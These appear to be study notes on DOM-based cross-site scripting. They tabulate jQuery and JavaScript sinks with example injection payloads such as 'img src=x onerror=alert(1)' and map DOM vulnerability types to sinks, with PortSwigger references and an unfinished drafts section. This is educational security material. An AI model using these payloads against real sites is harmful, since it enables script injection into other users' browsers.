>The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements. 


**DOM-based XSS in JQuery**

| jQuery Method | Description                                                                        | XSS Vector/Explanation                                                                                                                                                                                                               |
| ------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `add()`       | Adds elements to existing selection. Accepts selectors, HTML strings, or elements. | If passed a string containing HTML from an untrusted source, may trigger script insertion, especially pre–v3.5.0[](https://portswigger.net/web-security/cross-site-scripting/dom-based)[](https://github.com/mvondracek/jQuery-XSS). |
|               |                                                                                    |                                                                                                                                                                                                                                      |

## DOM-based XSS in jQuery

DOM-based XSS can also occur in third-party libraries and framework used on the client-side. One of the most popular dependencies is **jQuery**.

**DOM-based XSS in JQuery: sinks**

| **Sink**             | **Description & Example (XSS Payload Where Relevant)**                                                                                                                                                                                                           |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `add()`              | Adds elements to the current jQuery set, can inject HTML elements.  <br>**Example:** `$('div').add('<img src=x onerror=alert(1)>')` injects image triggering alert.                                                                                              |
| `after()`            | Inserts content immediately **after** each matched element.  <br>**Example:** `$('#id').after('<script>alert(1)</script>')` injects script after target element.                                                                                                 |
| `append()`           | Inserts content at the **end** inside each matched element.  <br>**Example:** `$('#id').append('<img src=x onerror=alert(1)>')` injects an image that triggers alert when loaded.                                                                                |
| `animate()`          | Primarily for animating CSS properties but can be abused if untrusted data are passed improperly in animation callbacks or properties controlling content insertion.  <br>Careful audit needed, but direct HTML injection less common than others.               |
| `insertAfter()`      | Inserts matched elements **after** a target element.  <br>Can create injection if argument contains unsafe HTML from untrusted sources.  <br>**Example:** `$('<img src=x onerror=alert(1)>').insertAfter('#id')` injects attacker-controlled image after target. |
| `insertBefore()`     | Inserts matched elements **before** a target element.  <br>Similar injection risk as `insertAfter()`.  <br>**Example:** `$('<script>alert(1)</script>').insertBefore('#id')` injects script before target element.                                               |
| `before()`           | Inserts content **before** each matched element.  <br>**Example:** `$('#id').before('<img src=x onerror=alert(1)>')` injects malicious image before the element.                                                                                                 |
| `html()`             | Gets or sets the HTML content of matched elements.  <br>Most commonly abused jQuery sink for DOM XSS.  <br>**Example:** `$('#id').html('<img src=x onerror=alert(1)>')` injects executable img tag.                                                              |
| `prepend()`          | Inserts content at the **start** inside each matched element.  <br>**Example:** `$('#id').prepend('<script>alert(1)</script>')` injects script at beginning of element content.                                                                                  |
| `replaceAll()`       | Replaces target elements with matched elements.  <br>If attacker-controlled strings create elements, can be used to inject malicious markup.  <br>**Example:** `$('<img src=x onerror=alert(1)>').replaceAll('#id')` replaces target with malicious image.       |
| `replaceWith()`      | Replaces each matched element with new content.  <br>Similar injection vector to `replaceAll()`.  <br>**Example:** `$('#id').replaceWith('<script>alert(1)</script>')` injects script replacing the target element.                                              |
| `wrap()`             | Wraps matched elements inside specified HTML structure.  <br>If parameter is attacker-controlled HTML, can lead to injection.  <br>**Example:** `$('#id').wrap('<div onmouseover="alert(1)">')` triggers alert on mouseover wrapping target.                     |
| `wrapInner()`        | Wraps the inner content of each matched element.  <br>Unsafe HTML leads to injection inside element.  <br>**Example:** `$('#id').wrapInner('<img src=x onerror=alert(1)>')` injects an image inside target element.                                              |
| `wrapAll()`          | Wraps all matched elements inside a single wrapper.  <br>Can be exploited if wrapper is attacker-controlled HTML.  <br>**Example:** `$('.class').wrapAll('<script>alert(1)</script>')` injects script wrapping all matched elements.                             |
| `has()`              | Checks if elements contain a selector.  <br>Itself not a sink, but if combined with unsafe selector construction from untrusted input, can cause selector injection leading to XSS.                                                                              |
| `constructor()`      | The jQuery constructor creates jQuery objects.  <br>When invoked as `jQuery(htmlString)`, can parse HTML strings and inject into DOM.  <br>**Example:** `$(untrustedHTML)` can inject unsafe markup causing XSS.                                                 |
| `init()`             | Internal jQuery initialization function.  <br>When called with HTML strings, can parse and add to DOM.  <br>Unsafe if attacker-controlled input used.  <br>Example usage is through `$(...)` selector function.                                                  |
| `index()`            | Returns the index of an element in a set.  <br>Not typically a sink for XSS itself, but untrusted data used to create or select elements can lead to selector injection.                                                                                         |
| `jQuery.parseHTML()` | Parses a string into an array of DOM nodes.  <br>Unsafe if used on attacker-controlled input and the nodes are inserted without sanitization.  <br>**Example:** `$.parseHTML('<img src=x onerror=alert(1)>')` creates dangerous elements.                        |
| `$.parseHTML()`      | Alias of `jQuery.parseHTML()`. Same XSS potential.  <br>Unsafe insertion of parsed nodes into DOM can cause XSS.                                                                                                                                                 |

- DOM-based XSS vulnerability jQuery functions:

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

Sinks that can lead to JavaScript injection:

```
eval()
Function()
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```
## References and further reading

- [`Document: domain property — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain)
- [`Same-origin policy: Changing origin — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#changing_origin)


- [`DOM-based document-domain manipulation — PortSwigger Web Security Academy`](https://portswigger.net/web-security/dom-based/document-domain-manipulation)
- [`DOM-based WebSocket-URL poisoning — PortSwigger Web Security Academy`](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)
- [`DOM-based link manipulation — PortSwigger Web Security Academy`](https://portswigger.net/web-security/dom-based/link-manipulation)


- [`Using Web Worders — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers)



| DOM-based vulnerability                                                                                             | Example sink               |
| ------------------------------------------------------------------------------------------------------------------- | -------------------------- |
| [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) LABS                                 | `document.write()`         |
| [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection) LABS                            | `window.location`          |
| [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) LABS                      | `document.cookie`          |
| [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)                         | `eval()`                   |
| [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)         | `document.domain`          |
| [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)                   | `WebSocket()`              |
| [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)                               | `element.src`              |
| [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)                 | `postMessage()`            |
| [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation) | `setRequestHeader()`       |
| [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)         | `FileReader.readAsText()`  |
| [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)               | `ExecuteSql()`             |
| [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)             | `sessionStorage.setItem()` |
| [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)           | `document.evaluate()`      |
| [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)             | `JSON.parse()`             |
| [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)                       | `element.setAttribute()`   |
| [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)                               | `RegExp()`                 |


## Drafts

| `window.location.port`                                                                           | Port number (e.g., `8080`).                                                                                                                                                                              |
| ------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `window.location.host`                                                                           | Hostname + `:` + port number (e.g., `example.com:8080`).                                                                                                                                                 |
| `window.location.protocol`                                                                       | URL scheme, including `:` (e.g., `http:`, `https:`).                                                                                                                                                     |
| `sessionStorage.setItem()`                                                                       | Used to store a key-value pair in the browser session storage object (data may later become a source when read back).                                                                                    |
| `localStoreage.setItem()`                                                                        | Used to store a key-value pair in the browser local storage object (data may later become a source when read back).                                                                                      |
- https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
- https://medium.com/@chiragrai3666/exploiting-postmessage-e2b01349c205
- https://jlajara.gitlab.io/Dom_XSS_PostMessage
- https://docs.ioin.in/writeup/www.exploit-db.com/_docs_40287_pdf/index.pdf